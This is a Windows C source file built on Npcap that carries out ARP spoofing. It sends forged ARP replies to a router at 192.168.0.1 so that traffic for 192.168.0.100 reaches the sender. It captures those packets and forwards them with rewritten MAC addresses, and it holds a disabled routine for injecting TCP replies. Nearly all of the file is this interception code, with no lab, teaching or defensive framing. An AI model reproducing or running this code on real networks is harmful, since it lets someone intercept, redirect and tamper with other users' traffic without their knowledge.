#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <iphlpapi.h> 

#include "pro_format.h"
#include "nets.h"
#include "npcap_utils.h"


extern void tcp_rep_frame(TCP_FRAME* hf, const unsigned char* bytes, int blen, char* payload, short payloadLen);

pcap_t *pHandle;
TCP_FRAME gtcpFrame;

void cb_pcap_data_received(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
    int frameType = 0;
    if (*((long*)bytes) == 2) {
        frameType = 1;
    } else {
        int ethType = bytes[12] << 8 | bytes[13];
        if (ethType == PRO_ARP) {
            frameType = 3;
            // register method
        } else if (ethType == PRO_IPV4) {
            frameType = 2;
        }
    } 
    if (1) {
        char fmac[] = {0xEA,0x92,0xA4,0xFA,0x43,0x7C};// 0xc0, 0xb6, 0xf9, 0x89, 0xec, 0xe8 
        char smac[] = {0xC0,0xB6,0xF9,0x89,0xEC,0xE8};
        char *forwarded = malloc(h->caplen);
        memcpy(forwarded, bytes, h->caplen);
        memcpy(forwarded, fmac, 6);
        memcpy(forwarded + 6, smac, 6);
        send_data(pHandle, forwarded, h->caplen);
        return;
    }
    if (frameType == 1 || frameType == 2) {
        printf("received tcp data\n");
        char* payload = "xwh";
        int plen = 3;
        int fhlen = 54;
        tcp_rep_frame(&gtcpFrame, (const unsigned char*)bytes, h->len, payload, plen);
        char* packet = (char*)&gtcpFrame.eheader;
        if (frameType == 1) {
            packet += 10;
            fhlen = 44;
        }
        send_data(pHandle, packet, fhlen + plen);
        return;
    }
    if (frameType == 3) {
        // ignore
    }

}

void send_arp(char* targetIp, char* targetMac, char* senderIp, short opcode) {
    char senderMac[6];
    get_adapter_mac(L"WLAN", senderMac);
    int sendTimes = 1;
    
    ARP_FRAME frame = {
        .eheader.proType = htons(PRO_ARP),

        .arpHeader.hardwareType = htons(0x0001),
        .arpHeader.proType = htons(PRO_IPV4),
        .arpHeader.hardwareSize = 0x06,
        .arpHeader.protocolSize = 0x04,
        .arpHeader.opcode = htons(opcode),
        .arpHeader.targetMac = {0}
    };

    memcpy(frame.eheader.dest_mac, targetMac, 6);
    memcpy(frame.eheader.src_mac, senderMac, 6);

    memcpy(frame.arpHeader.senderIp, senderIp, 4);
    memcpy(frame.arpHeader.senderMac, senderMac, 6);
    memcpy(frame.arpHeader.targetIp, targetIp, 4);
    if (opcode == ARP_REP) {
        memcpy(frame.arpHeader.targetMac, targetMac, 6);
        sendTimes = 50;
    }

    for (int i = 0; i < sendTimes;) {    
        send_data(pHandle, (char*)&frame, sizeof(ARP_FRAME));
        if (++i == sendTimes) {
            break;
        }
        Sleep(4000);
    }
}

u_long recevie_thread(LPVOID lparam) {

    handle_recv(pHandle, "dst host 192.168.0.100", cb_pcap_data_received);
}

void arp_sponsor() {
    char dupeIp[] = {192, 168, 0, 100};
    char senderMac[6] = {0}; // 0xC0, 0xB6, 0xF9, 0x89,0xEC,0xE8
    char routeIp[4] = {192,168,0,1};
    char routeMac[6] = {0x00,0x4b,0xf3,0xa3,0x07,0x88};
    send_arp(routeIp, routeMac, dupeIp, ARP_REP);
}

int main(int argc, char** argv) {

    char *adapterName;
    pick_dev(&adapterName);
    // choose_dev(&adapterName);
    dev_listen(&pHandle, adapterName);
    free(adapterName);

    
    // char reqIp[] = {192,168,0,102};
    // char senderIp[] = {192,168,0,108};
    // char targetMac[6] = {0};
    // send_arp(reqIp, targetMac, senderIp, ARP_REQ);
    
    HANDLE ht = CreateThread(0, 0, recevie_thread, 0, 0, 0);

    arp_sponsor();
    WaitForSingleObject(ht, 200000);

    arp_sponsor();
    pcap_close(pHandle);

    // TerminateThread()
}


